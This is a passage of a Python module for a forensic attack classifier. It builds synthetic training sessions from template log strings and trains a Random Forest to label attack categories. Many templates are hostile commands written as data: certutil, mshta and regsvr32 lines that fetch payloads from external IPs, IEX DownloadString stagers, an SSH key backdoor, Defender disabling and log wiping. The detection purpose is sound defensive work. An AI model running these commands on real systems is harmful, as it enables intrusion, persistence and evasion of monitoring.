        "Covenant implant grunts reporting to teamserver command and control C2",
        "Non-standard port outbound TCP 10.0.0.50 to 203.0.113.42 port 1337 C2",
        "Metasploit auxiliary/multi/handler caught connection C2 reverse shell",
        "Sleep interval variation 45s 52s 48s 61s jitter C2 beaconing pattern",
        "Cobalt Strike malleable C2 profile HTTP GET check-in beacon",
        "Havoc C2 framework agent implant check-in command control",
        "C2 over port 8443 non-standard HTTPS beaconing cobalt strike",
        "Sliver gRPC C2 implant beaconing command and control grpc teamserver",
        "meterpreter reverse_tcp payload established C2 session metasploit",
        "Pipe created MSSE-1337-server Cobalt Strike named pipe default C2 indicator",
        "Pipe connected svchost.exe MSSE named pipe Cobalt Strike process injection C2",
        "CreateRemoteThread svchost.exe explorer.exe Cobalt Strike process injection C2",
        "Malleable C2 profile mimics Microsoft update HTTP GET POST beacon",
        "agent.exe --connect 203.0.113.99:8443 --sleep 30 --jitter 20 C2 periodic beaconing",
        "Beacon stage retrieval IEX DownloadString C2 stager initial callback",
        "Check-in C2 teamserver beacon sleep 60 jitter 20 percent periodic connection",
        "Implant callback operator command execution C2 teamserver lateral recon",
        "ICMP tunnel large payload outbound flood external IP C2 covert channel",
        "WebSocket WSS C2 channel implant beaconing non-standard protocol",
        "DNS beaconing TXT record queries periodic external DNS C2 channel",
        "CS beacon reflective dll process inject svchost explorer named pipe C2",
    ],
    "persistence": [
        "schtasks /create /sc daily /tn Updater /tr C:\\temp\\update.exe /f persistence",
        "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Updater malware persistence",
        "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run SystemUpdate svchost persistence",
        "New service created sc create evilsvc binpath C:\\windows\\temp\\evil.exe start auto",
        "WMI event subscription ActiveScriptEventConsumer CommandLineEventConsumer persistence",
        "Startup folder C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Startup malware",
        "bash -c crontab -l /tmp/.sysupd/updater.sh crontab -  persistence every 5 minutes cron root",
        "systemctl enable malicious.service systemd persistence backdoor unit file",
        "Process Command Line: schtasks.exe /Create /SC ONLOGON /TN Microsoft\\Windows\\WindowsUpdate\\UpdateCheck /TR beacon.exe /RU alice /F persistence scheduled task",
        "Process Command Line: schtasks.exe /Create /SC MINUTE /MO 30 /TN Microsoft\\Windows\\Maintenance\\WinSAT /TR agent.exe persistence disguised WinSAT",
        "Process Command Line: reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpdate /t REG_SZ /d agent.exe registry Run key persistence",
        "A registry value was modified Object Name HKCU Software Microsoft Windows CurrentVersion Run WindowsSecurityHealth New Value: beacon.exe persistence",
        "WMI permanent subscription __EventFilter CommandLineEventConsumer ActiveScriptEventConsumer persistence",
        "echo ssh-rsa AAAA attacker@kali /root/.ssh/authorized_keys chmod 600 SSH backdoor persistence authorized_keys",
        "IAM user created backdoor_user AdministratorAccess policy persistence cloud",
        "Lambda function trigger CloudWatch Events rule every 5 minutes persistence AWS",
        "userinitmprlogonscript registry value persistent logon execution",
        "Scheduled task created Event 4698 SYSTEM context DiagnosticHub disguised persistence",
        "New service installed Event 7045 auto-start LocalSystem WindowsSecurityUpdate masquerading",
        "Registry value modified Event 4657 HKCU CurrentVersion Run MicrosoftEdgeUpdate persistence",
        "Image File Execution Options debugger hijack sethc.exe cmd.exe accessibility backdoor persistence",
        "COM hijacking HKCU CLSID InProcServer32 attacker DLL MMC.exe persistence T1546.015",
        "bitsadmin /transfer download backdoor BITS job persistence file transfer",
        "Startup LNK shortcut WindowsSecurityTray.lnk startup folder logon autostart persistence",
        "Winlogon userinitmprlogonscript HKLM registry logon script every user login persistence",
        "AppCompatFlags Custom shim database persistence DLL injection on process start",
        "WMI __EventFilter __FilterToConsumerBinding CommandLineEventConsumer root\\subscription persistence",
        "sc create auto-start LocalSystem service WindowsUpdateHelper new service persistence T1543",
        "Boot execute registry autostart smss.exe early boot persistence",
        "Print provider DLL persistence legitimate spooler process load attacker DLL",
        "Screensaver registry SCRNSAVE.EXE malware.scr persistence HKCU desktop",
        "netsh helper DLL add persistence netsh.exe loads attacker DLL system startup",
        "AppCertDLLs registry value DLL loaded every CreateProcess persistence T1546.009",
        "LaunchDaemon LaunchAgent macOS plist persistence /Library/LaunchDaemons",
        "crontab root /etc/cron.d persistent cron job Linux server persistence",
    ],
    "privilege_escalation": [
        "Process Command Line: python3 -c import os os.execl /bin/sh sh -p SUID Python3 privilege escalation setuid uid=0 root",
        "type=SYSCALL syscall=105 success=yes exit=0 uid=0 gid=0 comm=sh exe=/bin/sh key=priv_esc setuid(0) succeeded privilege escalation",
        "type=EXECVE argc=5 a0=find a1=/ a2=-perm a3=-4000 a4=-type a5=f SUID binary enumeration privilege escalation",
        "Process Command Line: net.exe localgroup administrators alice /add Token Elevation: TokenElevationTypeFull privilege escalation local admin",
        "UAC bypass via eventvwr.exe custom registry key HKCU Software Classes mscfile",
        "fodhelper.exe UAC bypass HKCU Software Classes ms-settings shell open command registry hijack TokenElevationTypeFull",
        "JuicyPotato SeImpersonatePrivilege abuse SYSTEM shell obtained privilege escalation named pipe impersonation",
        "PrintSpoofer privilege escalation Print Spooler named pipe impersonation SYSTEM",
        "SeImpersonatePrivilege token impersonation non-admin process SYSTEM cmd privilege",
        "sudo su - executed www-data webshell root escalation privilege Linux",
        "chmod +s /tmp/shell SUID bit set custom binary setuid privilege escalation",
        "Kernel exploit CVE-2021-34527 PrintNightmare LPE SYSTEM privilege escalation spoolsv",
        "runas /user:CORP\\Admin /savecred cmd.exe saved credential abuse privilege secondary logon",
        "High integrity level process spawned medium integrity parent TokenElevationTypeFull",
        "RoguePotato NTLM relay local service privilege escalation SYSTEM",
        "Token elevation TokenElevationTypeFull service account token impersonation",
        "sdclt.exe UAC bypass IsolatedCommand registry key hijack privilege escalation",
        "AlwaysInstallElevated MSI installation SYSTEM privileges privilege escalation T1548",
        "Unquoted service path malicious binary placed C:\\Program Files privilege escalation T1574",
        "SecLogon CreateProcessWithLogonW token theft privilege escalation secondary logon",
        "Added local administrators group net localgroup privilege escalation T1136",
        "juicypotato rottenpotato sweetpotato privilege escalation SYSTEM named pipe impersonation",
        "Special privileges assigned 4672 SeDebugPrivilege SeImpersonatePrivilege assigned logon",
        "spoolsv.exe spawning cmd.exe PrintNightmare CVE-2021-34527 SYSTEM print spooler exploit",
        "DirtyPipe CVE-2022-0847 Linux kernel privilege escalation root write pipe",
        "pkexec CVE-2021-4034 Polkit local privilege escalation root Linux",
        "Docker container escape privileged container host namespace privilege escalation",
        "Kubernetes RBAC ClusterAdmin privilege escalation service account abuse",
        "Group Policy restricted groups local admin privilege escalation GPO abuse",
        "DLL hijacking service binary unquoted path privilege escalation SYSTEM",
        "lpe local privilege escalation tool automated priv esc check SYSTEM shell",
        "Token impersonation SeAssignPrimaryTokenPrivilege SeTcbPrivilege SYSTEM token",
        "UAC bypass sdclt eventvwr fodhelper silentcleanup registry hijack medium to high",
        "net localgroup administrators /add privilege escalation local admin group member",
        "Full token elevation privilege escalation high integrity SYSTEM admin access",
    ],
    "defense_evasion": [
        "The audit log was cleared. Subject: Account Name: Administrator Account Domain: CORP Logon ID: 0x8B3F40. Security event log cleared wevtutil cl security Event ID 1102",
        "Process Command Line: wevtutil.exe cl Security wevtutil cl System wevtutil cl Microsoft-Windows-PowerShell/Operational wevtutil cl Microsoft-Windows-Sysmon/Operational defense evasion log clearing",
        "Process Command Line: powershell.exe -NonInteractive -EncodedCommand Set-MpPreference -DisableRealtimeMonitoring 1 Defender disabled defense evasion encoded",
        "Process Command Line: powershell.exe -Command Add-MpPreference -ExclusionPath C:\\ProgramData\\Microsoft\\ AV exclusion defense evasion",
        "Process Command Line: mshta.exe https://203.0.113.99/stage1.hta LOLBAS mshta signed binary proxy execution defense evasion",
        "Process Command Line: regsvr32.exe /s /n /u /i:http://203.0.113.99/payload.sct scrobj.dll squiblydoo LOLBAS defense evasion",
        "Process Command Line: wmic.exe process call create powershell.exe -w hidden defense evasion WMI parent process masquerading",
        "Process Command Line: certutil.exe -urlcache -split -f http://185.234.219.42:8080/payload/lb.exe LOLBAS certutil ingress tool transfer defense evasion",
        "Process Command Line: certutil.exe -encode backup_nov22.7z backup_nov22.b64 certutil encode defense evasion DLP bypass LOLBAS",
        "Process Command Line: powershell.exe -w hidden -NoP -NonI -Ep Bypass -c IEX Net.WebClient DownloadString encodedcommand fileless defense evasion",
        "type=EXECVE argc=3 a0=bash a1=-c a2=history -c unset HISTFILE rm ~/.bash_history shred defense evasion anti-forensics Linux",
        "find /var/log -name .log -newer /tmp/.sysupd -exec shred -u defense evasion log destruction Linux",
        "Process Command Line: cmd.exe /c del /f /q /s staging\\ backup_nov22.7z backup_nov22.b64 anti-forensics cleanup defense evasion",
        "Process hollowing legitimate svchost.exe hollowed replaced payload defense evasion",
        "Masquerading malware renamed svchost.exe non-system directory defense evasion",
        "1102 security log cleared audit log defense evasion anti-forensics indicator removal",
        "lolbas lolbin living off the land signed binary proxy mshta regsvr32 certutil wmic",
        "GuardDuty detector disabled DisableDetector API defense evasion cloud",
        "CloudTrail StopLogging DeleteTrail audit trail removal defense evasion AWS",
        "auditpol /clear all audit policies disabled defense evasion anti-forensics",
        "AMSI bypass reflection amsiutils amsi.dll patch memory defense evasion",
        "amsiUtils amsiContext patch bypass AMSI antimalware scan interface defense evasion",
        "ScriptBlock logging disabled module logging disabled PowerShell defense evasion",
        "ETW event tracing windows patch NtTraceEvent defense evasion bypass logging",
        "Invoke-Obfuscation obfuscated PowerShell command string replace defense evasion",
        "Compress-Archive PowerShell built-in defense evasion DLP bypass",
        "Sysmon driver unload fltmc unload SysmonDrv driver removal defense evasion",
        "CloudTrail stoplogs AWS delete trail defense evasion cloud logging disabled",
        "Binary masquerading signed binary proxy defense evasion trusted process",
        "Reflective DLL injection process hollowing memory-only execution defense evasion",
        "wevtutil cl PowerShell Operational Sysmon Operational Security System log clear defense",
        "Set-MpPreference DisableRealtimeMonitoring DisableIOAVProtection Defender disabled defense",
        "Timestamp modified timestomp MACE metadata forensic evasion defense evasion",
        "Obfuscated command chr() string replace concat PowerShell defense evasion",
        "Process injection reflective dll shellcode inject running process defense evasion",
    ],
    "reconnaissance": [
        "Process Command Line: cmd.exe /c whoami && net user /domain && net group Domain Admins /domain && ipconfig /all && nltest /dclist:corp.local && arp -a post-exploitation reconnaissance",
        "Process Command Line: powershell.exe -Command Import-Module PowerView.ps1 Get-DomainUser -SPN samaccountname serviceprincipalname Export-Csv spns.csv SPN enumeration reconnaissance",
        "Process Command Line: powershell.exe -Command whoami /all net user /domain net group Domain Admins Get-WmiObject Win32_ComputerSystem arp -a post-compromise recon",
        "type=EXECVE a2=cat /etc/passwd && cat /etc/os-release && uname -a && ps aux && netstat -an web shell reconnaissance Linux",
        "GET /wp-content/uploads/system_health.php?cmd=id HTTP 200 web shell recon uid=33 www-data",
        "GET /wp-content/uploads/system_health.php?cmd=cat+/etc/passwd+%26%26+uname+-a+%26%26+ps+aux+%26%26+netstat+-an reconnaissance web shell",
        "nmap -sV -sC -O 10.0.0.0/24 full network scan reconnaissance",
        "masscan 10.0.0.0/16 -p1-65535 --rate=10000 rapid port scan reconnaissance",
        "ldapsearch -x -h 10.0.0.1 -b DC=CORP DC=LOCAL LDAP enumeration reconnaissance",
        "net user /domain all domain users enumerated reconnaissance",
        "net group Domain Admins /domain privileged group enumeration reconnaissance",
        "nltest /dclist:CORP.LOCAL domain controller list reconnaissance",
        "bloodhound-python -c ALL -d CORP.LOCAL AD attack path mapping BloodHound",
        "SharpHound.exe -c All --zipfilename loot.zip BloodHound collector recon",
        "PowerView Get-DomainUser Get-DomainComputer Properties samaccountname reconnaissance",
        "whoami /all privilege group token enumeration reconnaissance",
        "systeminfo ipconfig /all network configuration OS fingerprinting reconnaissance",
        "netstat -an active connections listening ports reconnaissance",
        "gobuster dir -u http://10.0.0.80 -w dirbuster directory bruteforce recon web",
        "aws ec2 describe-instances aws iam list-users cloud resource enumeration getcalleridentity recon",
        "Find-LocalAdminAccess Get-DomainGroupMember Domain Admins PowerView AD recon attack path",
        "dsquery user dsget user samid memberof full directory enumeration reconnaissance",
        "ldapdomaindump comprehensive AD dump users groups computers GPOs LDAP recon",
        "ADRecon comprehensive AD enumeration GPO ACL trust DC Excel report reconnaissance",
        "SMB signing not required crackmapexec shares enumeration lateral attack path",
        "enum4linux rpcclient SMB enumeration domain users groups shares reconnaissance",
        "snmpwalk MIB tree network device enumeration reconnaissance SNMP",
        "nikto web server vulnerability scan reconnaissance T1595",
        "dnsenum DNS zone transfer subdomain brute force reconnaissance DNS",
        "wmic computersystem wmic process list os get recon system information",
        "Invoke-BloodHound CollectionMethod All domain CORP.LOCAL attack path enumeration",
        "powerview find-localadminaccess get-domainuser get-domaingroup recon AD enumeration",
        "port scan portscan host discovery network reconnaissance nmap masscan zmap",
        "4661 SAM LSA object handle request directory service access reconnaissance",
        "CrackMapExec smb --shares SMB share enumeration credential spray recon",
    ],
}

# ── Structural feature helpers ─────────────────────────────────────────────────

_PROCESS_TERMS = frozenset({"4688", "process created", "exec", "spawn", "fork", "/proc", "cmdline", "new process"})
_AUTH_TERMS    = frozenset({"4624", "logon", "login", "auth", "authentication", "session opened", "accepted password", "successful logon"})
_NET_TERMS     = frozenset({"tcp", "udp", "icmp", "pcap", "firewall", "packet", "flow", "connection", "port", "network"})

import re as _re
_EXTERNAL_IP_RE = _re.compile(
    r'\b(?!(?:10\.|127\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.))'
    r'(?:[1-9]\d{1,2}\.){3}[1-9]\d{1,2}\b'
)


def _extract_features(events: list) -> list[float]:
    """Extract a fixed-length feature vector from a list of ForensicEvent-like objects."""
    if not events:
        return [0.0] * (len(ATTACK_CATEGORIES) + 9)

    corpus = " ".join(
        (getattr(e, "description", "") or "") + " " + (getattr(e, "event_type", "") or "")
        for e in events
    ).lower()

    n = len(events)

    # 1. Keyword hit scores per category (hits / event_count)
    kw_features: list[float] = []
    for cat in ATTACK_CATEGORIES:
        hits = sum(1 for kw in _KEYWORDS[cat] if kw in corpus)
        kw_features.append(hits / max(1, n))

    # 2. Structural features
    hosts = {getattr(e, "source_host", None) for e in events if getattr(e, "source_host", None)}
    users = {getattr(e, "user", None) for e in events if getattr(e, "user", None)}

    try:
        from datetime import datetime as _dt
        ts_vals = []
        for e in events:
            ts = getattr(e, "timestamp", None)
            if ts is None:
                continue
            if isinstance(ts, _dt):
                ts_vals.append(ts.timestamp())
        time_span_hours = (max(ts_vals) - min(ts_vals)) / 3600.0 if len(ts_vals) > 1 else 0.0
        off_hours = sum(
            1 for e in events
            if getattr(e, "timestamp", None) is not None
            and isinstance(getattr(e, "timestamp"), _dt)
            and (e.timestamp.hour < 7 or e.timestamp.hour >= 19)
        ) / n
    except Exception:
        time_span_hours = 0.0
        off_hours = 0.0

    process_ratio = sum(
        1 for e in events
        if any(t in (getattr(e, "event_type", "") or "").lower()
               or t in (getattr(e, "event_id", "") or "")
               for t in _PROCESS_TERMS)
    ) / n

    auth_ratio = sum(
        1 for e in events
        if any(t in (getattr(e, "description", "") or "").lower() for t in _AUTH_TERMS)
    ) / n

    net_ratio = sum(
        1 for e in events
        if any(t in (getattr(e, "event_type", "") or "").lower() for t in _NET_TERMS)
        or "pcap" in str(getattr(e, "raw_source", "") or "").lower()
    ) / n

    has_external_ip = 1.0 if _EXTERNAL_IP_RE.search(corpus) else 0.0

    structural: list[float] = [
        math.log1p(n),
        math.log1p(len(hosts)),
        math.log1p(len(users)),
        min(time_span_hours / 24.0, 1.0),
        off_hours,
        process_ratio,
        auth_ratio,
        net_ratio,
        has_external_ip,
    ]

    return kw_features + structural


# ── Real scenario data loading & augmentation ─────────────────────────────────

# Resolve sample_data/ relative to this module: backend/analysis/ → repo root → sample_data/
_SAMPLE_DIR = _Path(__file__).resolve().parent.parent.parent / "sample_data"

# Maps JSONL filename stem → attack category label.
# The loader searches sample_data/ recursively, so subdirectory files are found
# automatically — only the stem (filename without .jsonl) needs to be listed here.
_SCENARIO_LABEL_MAP: dict[str, str] = {
    # ── Root-level scenario files (legacy flat layout) ──────────────────────
    "scenario_ransomware":                    "ransomware",
    "scenario_apt_kerberoasting":             "kerberoasting",
    "scenario_insider_exfil":                 "data_exfiltration",
    "scenario_linux_webshell":                "c2_communication",
    "scenario_lolbas":                        "defense_evasion",
    "scenario_c2_cobalt_strike":              "c2_communication",
    "scenario_credential_theft":              "credential_theft",
    "scenario_lateral_movement_smb":          "lateral_movement",
    "scenario_reconnaissance_ad":             "reconnaissance",
    "scenario_privilege_escalation_windows":  "privilege_escalation",
    "scenario_persistence_wmi":               "persistence",
    "scenario_windows_attack":                "lateral_movement",

    # Real OTRF captures (downloaded by fetch_real_datasets.py)
    "otrf_empire_dcsync_real":              "credential_theft",
    "otrf_empire_wmi_lateral_real":         "lateral_movement",
    "otrf_empire_mimikatz_logonpasswords_real": "credential_theft",
    "otrf_ntds_shadow_copy_real":           "credential_theft",
    "otrf_empire_psexec_real":              "lateral_movement",
    "otrf_empire_mimikatz_sam_real":        "credential_theft",
    # APT29 Day 1 is kept test-only (not in training) to preserve train/test separation
    # ── AD Full Attack Chain (sample_data/01_AD_Full_Attack_Chain/) ─────────
    # Not used as a test scenario — safe to use for training
    "ad_attack_scenario":                     "lateral_movement",
    "dc01_security_eventlog":                 "lateral_movement",
}


def _load_real_sessions(data_dir: _Path = _SAMPLE_DIR) -> dict[str, list[list[dict]]]:
    """
    Load labeled attack sessions from JSONL scenario files.

    Searches data_dir recursively so that scenario files stored in subdirectories
    (e.g. sample_data/12_Turla_APT_Eval/01_kerberoasting.jsonl) are discovered
    automatically.  Each file is treated as one complete labeled session.
    Returns a dict mapping category → list of sessions.
    """
    sessions: dict[str, list[list[dict]]] = {cat: [] for cat in ATTACK_CATEGORIES}

    # Build a reverse lookup: stem → category
    stem_to_cat = dict(_SCENARIO_LABEL_MAP)

    # Walk the entire sample_data tree once
    loaded = 0
    for jsonl_path in sorted(data_dir.rglob("*.jsonl")):
        cat = stem_to_cat.get(jsonl_path.stem)
        if cat is None:
            continue  # unlabelled file — skip
        events: list[dict] = []
        try:
            with open(jsonl_path, encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if line:
                        try:
                            events.append(_json.loads(line))
                        except _json.JSONDecodeError:
                            pass
        except Exception as exc:
            logger.warning("Could not load scenario file %s: %s", jsonl_path.name, exc)
            continue
        if events:
            sessions[cat].append(events)
            loaded += 1
            logger.debug("Loaded %s → %s (%d events)", jsonl_path.name, cat, len(events))

    total = sum(len(v) for v in sessions.values())
    logger.info(
        "Loaded %d real scenario files (%d labeled sessions) from %s",
        loaded, total, data_dir,
    )
    return sessions


def _augment_real_sessions(
    sessions: dict[str, list[list[dict]]],
    rng: random.Random,
    n_augments: int = 25,
    min_size: int = 5,
) -> list[tuple[list[dict], str]]:
    """
    Produce augmented training samples from real sessions via random subwindow sampling.

    For each real session, generates n_augments variants by randomly selecting
    a contiguous window or a random sample of events.  Returns a flat list of
    (event_dicts, category) pairs ready to be converted to feature vectors.
    """
    result: list[tuple[list[dict], str]] = []

    for cat, session_list in sessions.items():
        for session in session_list:
            n = len(session)
            if n == 0:
                continue
            # Always include the full session as-is
            result.append((session, cat))
            if n < min_size:
                continue
            for _ in range(n_augments):
                size = rng.randint(min_size, n)
                if n > min_size and rng.random() < 0.55:
                    # Contiguous temporal window — preserves attack chain ordering
                    start = rng.randint(0, n - size)
                    sample = session[start: start + size]
                else:
                    # Random subset — teaches the model partial signal detection
                    sample = rng.sample(session, size)
                result.append((sample, cat))

    return result


# ── Training data generation (real + synthetic) ───────────────────────────────

def _generate_training_data(n_per_class: int = 500, seed: int = 42) -> tuple[list, list]:
    """
    Build training data mixing real labeled sessions (augmented) with synthetic sessions.

    Composition:
      - Real: each scenario file × n_augments augmented variants
      - Synthetic: n_per_class sessions per class from template library
    """
    from datetime import datetime as _dt, timedelta as _td

    rng = random.Random(seed)
    X: list[list[float]] = []
    y: list[str] = []

    class _FakeEvent:
        __slots__ = ("description", "event_type", "event_id", "source_host", "user", "timestamp", "raw_source")

        def __init__(self, desc: str, etype: str, host: str, user: str, ts: _dt):
            self.description = desc
            self.event_type  = etype
            self.event_id    = None
            self.source_host = host
            self.user        = user
            self.timestamp   = ts
            self.raw_source  = "generic"

    base_ts = _dt(2024, 1, 15, 10, 0, 0)
    event_types = ["process_created", "logon", "network", "file_access", "registry_change"]

    # ── Phase 1: Real sessions (augmented) ───────────────────────────────────
    real_sessions = _load_real_sessions()
    augmented_pairs = _augment_real_sessions(real_sessions, rng)

    for event_dicts, cat in augmented_pairs:
        fake_events = []
        for d in event_dicts:
            msg     = d.get("message", "")
            ts_str  = d.get("datetime", "")
            try:
                ts = _dt.fromisoformat(ts_str.replace("Z", "+00:00")).replace(tzinfo=None)
            except Exception:
                ts = base_ts + _td(minutes=rng.randint(0, 60))

            fake_events.append(_FakeEvent(
                desc=msg,
                etype=d.get("timestamp_desc", "process_created"),
                host=d.get("hostname", "HOST-00"),
                user=d.get("username", "user0"),
                ts=ts,
            ))

        if fake_events:
            X.append(_extract_features(fake_events))
            y.append(cat)

    real_count = len(X)
    logger.debug("Real training samples: %d", real_count)

    # ── Phase 2: Synthetic sessions ──────────────────────────────────────────
    for cat in ATTACK_CATEGORIES:
        templates   = _TEMPLATES[cat]
        other_cats  = [c for c in ATTACK_CATEGORIES if c != cat]

        for _ in range(n_per_class):
            n_primary = rng.randint(5, min(40, len(templates)))
            primary   = rng.choices(templates, k=n_primary)

            n_noise  = rng.randint(0, 4)
            noise    = rng.choices(_TEMPLATES[rng.choice(other_cats)], k=n_noise) if n_noise else []

            descs = primary + noise
            rng.shuffle(descs)

            n_hosts = rng.randint(1, 5)
            n_users = rng.randint(1, 3)
            hosts   = [f"HOST-{i:02d}" for i in range(n_hosts)]
            users_  = [f"user{i}" for i in range(n_users)]

            t = base_ts
            events = []
            for desc in descs:
                t += _td(minutes=rng.randint(1, 10))
                events.append(_FakeEvent(
                    desc=desc,
                    etype=rng.choice(event_types),
                    host=rng.choice(hosts),
                    user=rng.choice(users_),
                    ts=t,
                ))

            X.append(_extract_features(events))
            y.append(cat)

    logger.debug(
        "Total training samples: %d (%d real+augmented, %d synthetic)",
        len(X), real_count, len(X) - real_count,
    )
    return X, y


# ── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class AttackClassification:
    primary_attack: str           # top category key, e.g. "ransomware"
    confidence: float             # 0.0 – 1.0
    confidence_label: str         # "none" | "low" | "medium" | "high"
    all_scores: dict[str, float]  # score per category
    top_evidence: list[str]       # matched keywords from primary category
    mitre_techniques: list[str]   # MITRE IDs for primary category


# ── Classifier ────────────────────────────────────────────────────────────────

class AttackClassifier:
    """
    Random Forest classifier trained on real attack scenario sessions (augmented)
    plus synthetic sessions generated from MITRE ATT&CK-derived templates.

    Falls back to pure keyword scoring when scikit-learn is unavailable.
    """

    def __init__(self) -> None:
        self._model: Optional[object] = None
        self._classes: list[str] = ATTACK_CATEGORIES[:]
        self._trained = False
        self._train()

    def _train(self) -> None:
        if not _SKLEARN:
            return
        try:
            X, y = _generate_training_data(n_per_class=400)
            X_arr = np.array(X, dtype=np.float32)
            clf = RandomForestClassifier(
                n_estimators=200,
                max_depth=None,
                min_samples_leaf=2,
                class_weight="balanced",
                random_state=42,
                n_jobs=-1,
            )
            clf.fit(X_arr, y)
            self._model   = clf
            self._classes = list(clf.classes_)
            self._trained = True
            logger.info(
                "Attack classifier trained on %d samples (%d classes)",
                len(X), len(ATTACK_CATEGORIES),
            )
        except Exception:
            logger.exception("Attack classifier training failed — falling back to keyword scoring")

    def classify(self, events: list) -> AttackClassification:
        if not events:
            return AttackClassification(
                primary_attack="unknown", confidence=0.0,
                confidence_label="none", all_scores={},
                top_evidence=[], mitre_techniques=[],
            )

        feats = _extract_features(events)

        if self._trained and self._model is not None:
            probs  = self._model.predict_proba(np.array([feats], dtype=np.float32))[0]
            scores = {cat: float(p) for cat, p in zip(self._classes, probs)}
        else:
            # Keyword-only fallback: normalize keyword hit rates
            kw_hits = {cat: feats[i] for i, cat in enumerate(ATTACK_CATEGORIES)}
            total   = sum(kw_hits.values()) or 1.0
            scores  = {cat: v / total for cat, v in kw_hits.items()}

        primary       = max(scores, key=scores.__getitem__)
        primary_score = scores[primary]

        if primary_score >= 0.65:
            conf_label = "high"
        elif primary_score >= 0.40:
            conf_label = "medium"
        elif primary_score >= 0.20:
            conf_label = "low"
        else:
            conf_label = "none"

        # Extract top evidence from primary category keywords present in corpus
        corpus   = " ".join((getattr(e, "description", "") or "") for e in events).lower()
        evidence = [kw for kw in _KEYWORDS.get(primary, []) if kw in corpus][:6]

        mitre = ATTACK_META.get(primary, {}).get("mitre", [])

        return AttackClassification(
            primary_attack=primary,
            confidence=round(primary_score, 4),
            confidence_label=conf_label,
            all_scores={k: round(v, 4) for k, v in sorted(scores.items(), key=lambda x: -x[1])},
            top_evidence=evidence,
            mitre_techniques=mitre,
        )


# ── Module-level singleton ────────────────────────────────────────────────────

_classifier: Optional[AttackClassifier] = None


def get_classifier() -> AttackClassifier:
    global _classifier
    if _classifier is None:
        _classifier = AttackClassifier()
    return _classifier


def classify_session(events: list) -> AttackClassification:
    """Classify a list of ForensicEvent-like objects into an attack category."""
    return get_classifier().classify(events)
